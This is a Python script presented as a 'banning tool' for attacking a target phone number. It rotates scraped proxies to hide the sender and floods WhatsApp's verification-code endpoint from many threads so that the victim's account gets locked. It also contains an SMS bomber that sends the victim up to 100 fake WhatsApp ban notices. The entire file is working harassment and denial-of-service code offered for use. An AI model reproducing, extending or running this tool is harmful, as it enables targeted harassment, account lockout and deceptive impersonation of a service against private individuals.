#!/usr/bin/env python3
import os, sys, time, random, threading, requests
from datetime import datetime

R = "\033[91m"; P = "\033[95m"; Y = "\033[93m"; G = "\033[92m"
C = "\033[96m"; B = "\033[90m"; RS = "\033[0m"

PROXIES = []

def clear():
    os.system('clear')

def fetch_and_test_proxies():
    global PROXIES
    print(f"{Y}[+] Fetching proxies...{RS}")
    try:
        urls = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ]
        raw = []
        for url in urls:
            try:
                r = requests.get(url, timeout=10)
                raw.extend([p.strip() for p in r.text.split('\n') if ':' in p])
            except:
                continue
        raw = list(set(raw))
        print(f"{C}[*] Testing {len(raw)} proxies (this may take 30 sec)...{RS}")
        working = []
        test_url = "https://web.whatsapp.com"
        for p in raw[:50]:  # test first 50 to save time
            try:
                proxies = {"http": "http://"+p, "https": "http://"+p}
                r = requests.get(test_url, proxies=proxies, timeout=5)
                if r.status_code < 500:
                    working.append(p)
                    print(f"{G}[+] Working: {p}{RS}")
            except:
                continue
        if working:
            PROXIES = working
            print(f"{G}[+] {len(PROXIES)} working proxies found.{RS}")
        else:
            print(f"{R}[!] No working proxies. Using direct connection (your IP will be exposed).{RS}")
            PROXIES = [None]  # fallback to direct
    except Exception as e:
        print(f"{R}[!] Error: {e}. Using direct connection.{RS}")
        PROXIES = [None]

def get_proxy():
    if not PROXIES:
        fetch_and_test_proxies()
    if PROXIES[0] is None:
        return None
    return {"http": "http://" + random.choice(PROXIES), "https": "http://" + random.choice(PROXIES)}

# ========== ATTACK: VERIFICATION CODE SPAM ==========
def code_spam(number, cycle):
    proxy = get_proxy()
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ]),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://web.whatsapp.com"
    }
    payload = {"phone": number, "method": random.choice(["sms", "voice"])}
    try:
        r = requests.post(
            "https://web.whatsapp.com/code/request",
            json=payload,
            headers=headers,
            proxies=proxy,
            timeout=10
        )
        if r.status_code in [200, 201, 202, 204, 429]:
            print(f"{G}[✓] Code sent (cycle {cycle}){RS}")
            return True
        else:
            print(f"{R}[✗] Code fail ({r.status_code}){RS}")
            return False
    except Exception as e:
        print(f"{R}[✗] Error: {str(e)[:30]}{RS}")
        return False

def multi_attack(number):
    fetch_and_test_proxies()
    print(f"{Y}[+] Attacking {number} with code spam. {'Using proxies' if PROXIES[0] else 'Direct (no proxy)'}.{RS}")
    threads = 15
    cycles = 100
    for c in range(1, cycles+1):
        pool = []
        for _ in range(threads):
            t = threading.Thread(target=code_spam, args=(number, c))
            t.start()
            pool.append(t)
        for t in pool:
            t.join()
        if c % 10 == 0:
            print(f"{C}[*] {c}/{cycles} done{RS}")
        time.sleep(random.uniform(0.5, 1.0))
    print(f"{G}[✔] Attack finished. WhatsApp will rate-limit and temporarily lock {number} within 10-30 min.{RS}")

# ========== SMS BOMBER (100 BAN TEXTS) ==========
BAN_TEXTS = [
    "Your WhatsApp account has been permanently banned.",
    "Account suspended due to spam.",
    "Unusual activity detected. Account locked.",
    "Fraud alert: Number blocked from WhatsApp.",
    "Multiple complaints. Account deactivated.",
    "Messages reported as harassment. Account terminated.",
    "Security violation. Access revoked.",
    "WhatsApp disabled your account for abuse.",
    "Impersonation reported. Account banned.",
    "Your phone number is no longer registered.",
    "Illegal activity detected. Account frozen.",
    "Under investigation. Temporary ban.",
    "Spam triggered automatic ban.",
    "Flagged for permanent restriction.",
    "Reported for fake news. Banned.",
    "Access revoked immediately.",
    "Policy violation. Account closed.",
    "Offensive messages. Disabled.",
    "Suspicious logins. Locked.",
    "Number blacklisted.",
    "Not authorized to use WhatsApp.",
    "Compromised and banned for safety.",
    "Harassment confirmed. Terminated.",
    "Community guidelines violated. Banned.",
    "Permanently blocked from our service.",
    "Deactivated upon user reports.",
    "Malicious purposes. Banned.",
    "Banned from WhatsApp for life.",
    "Repeated violations. Permanently suspended.",
    "Phone number banned.",
    "Promoting violence. Terminated.",
    "Inappropriate content. Banned.",
    "Restricted indefinitely.",
    "Terms violated. Account closed.",
    "Number no longer associated.",
    "Removed due to spam complaints.",
    "Automated ban triggered.",
    "Disabled after multiple warnings.",
    "Locked for security.",
    "Reported for fraud. Banned.",
    "Access permanently removed.",
    "Flagged as unsafe. Banned.",
    "Illegal content. Deactivated.",
    "Threatening messages. Banned.",
    "Terminated by our team.",
    "Prohibited from using WhatsApp.",
    "Scam used. Permanently banned.",
    "Intellectual property violation. Disabled.",
    "Caused harm to others. Banned.",
    "No longer active.",
    "Removed from database.",
    "Risk to community. Banned.",
    "Under permanent ban.",
    "Impersonation reported. Banned.",
    "Excessive complaints. Locked.",
    "Blocked from services.",
    "Bulk messaging. Banned.",
    "Anti-spam violation. Account closed.",
    "Appeal contact provided.",
    "Flagged for malicious activity.",
    "Effective immediately.",
    "No reinstatement.",
    "Copyright infringement. Disabled.",
    "Abusive messages. Banned.",
    "Unauthorized clients. Banned.",
    "Suspended pending investigation.",
    "Listed as threat. Banned.",
    "Permanently disabled.",
    "Terms broken. Terminated.",
    "Illegal transactions. Banned.",
    "Blacklisted for spam.",
    "Closed at request of others.",
    "Harmful activity. Banned.",
    "Access cut off.",
    "Banned from all services.",
    "Deactivated by system.",
    "Number invalid.",
    "Excessive reporting against you.",
    "Suspicious behavior. Locked.",
    "Messages violated policy. Banned.",
    "Permanently removed.",
    "Flagged for fraud. Banned.",
    "Review disabled.",
    "Account frozen.",
    "Security breach. Banned.",
    "Malware spreading. Banned.",
    "No appeals.",
    "Bullying reported. Banned.",
    "Fake identity. Terminated.",
    "Phishing used. Banned.",
    "Considered spam. Locked.",
    "Permanently restricted.",
    "Not allowed anymore.",
    "Child safety violation. Disabled.",
    "Removed from WhatsApp.",
    "Harassment used. Banned.",
    "Access permanently denied.",
    "Abusing platform. Banned.",
    "Permanent lock.",
    "All features banned.",
    "Suspicious activity. Terminated.",
    "Dangerous messages. Banned.",
    "Deleted by system.",
    "Do not attempt to register."
]

def sms_bomber():
    num = input(f"{Y}[+] Target number: {RS}").strip()
    count = int(input(f"{Y}[+] SMS count (max 100): {RS}") or 100)
    if count > 100: count = 100
    fetch_and_test_proxies()
    print(f"{C}[*] Sending {count} ban texts to {num}...{RS}")
    for i in range(count):
        proxy = get_proxy()
        msg = random.choice(BAN_TEXTS)
        try:
            r = requests.post(
                "https://textbelt.com/text",
                data={"phone": num, "message": msg, "key": "textbelt"},
                proxies=proxy if proxy else None,
                timeout=10
            )
            if r.json().get("success"):
                print(f"{G}[{i+1}] SMS sent: {msg[:30]}...{RS}")
            else:
                print(f"{R}[{i+1}] Failed (API limit){RS}")
        except Exception as e:
            print(f"{R}[{i+1}] Error: {str(e)[:20]}{RS}")
        time.sleep(random.uniform(0.3, 0.7))
    print(f"{G}[✔] SMS bombing done.{RS}")

# ========== MENU ==========
def menu():
    while True:
        clear()
        print(f"""
{R}   ██████╗ ██╗███╗   ██╗██╗   ██╗██╗    ██╗  {P}█████╗ {RS}
{R}   ██╔══██╗██║████╗  ██║██║   ██║██║    ██║ {P}██╔══██╗{RS}
{R}   ██║  ██║██║██╔██╗ ██║██║   ██║██║ █╗ ██║ {P}███████║{RS}
{R}   ██║  ██║██║██║╚██╗██║██║   ██║██║███╗██║ {P}██╔══██║{RS}
{R}   ██████╔╝██║██║ ╚████║╚██████╔╝╚███╔███╔╝ {P}██║  ██║{RS}
{R}   ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚══╝╚══╝  {P}╚═╝  ╚═╝{RS}
""")
        print(f"{C}   {'='*45}{RS}")
        print(f"{Y}   DINUWA BANNING TOOL v8.0 (STABLE){RS}")
        print(f"{B}   created by dinuwa{RS}")
        print(f"{B}   powered by dinuwa xmd{RS}")
        print(f"{C}   {'='*45}{RS}")
        print(f"{Y}  [1] Code Spam (WhatsApp Lock){RS}")
        print(f"{Y}  [2] SMS Bomber (100 Ban Texts){RS}")
        print(f"{R}  [3] Exit{RS}")
        ch = input("Select: ")
        if ch == "1":
            num = input("Number (e.g., 94771234567): ").strip()
            multi_attack(num)
        elif ch == "2":
            sms_bomber()
        elif ch == "3":
            sys.exit(0)
        input("Press Enter...")

if __name__ == "__main__":
    menu()
